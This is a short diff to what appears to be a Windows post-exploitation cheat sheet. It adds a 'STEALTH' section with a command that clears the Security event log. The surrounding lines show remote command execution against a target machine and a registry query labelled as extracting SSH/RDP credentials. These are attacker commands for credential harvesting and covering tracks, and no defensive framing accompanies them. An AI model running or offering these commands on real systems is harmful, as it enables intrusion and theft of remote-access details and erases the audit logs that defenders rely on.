@@ -72,3 +72,9 @@ Invoke-Command -ComputerName target_machine_ip -ScriptBlock { Get-Process }
 #extracting ssh/rdp creds
 reg query HKLM\SOFTWARE\Microsoft\Terminal Server Client\Default\Servers
 
+###############
+STEALTH
+###############
+#clear logs
+Clear-EventLog -LogName "Security"
+
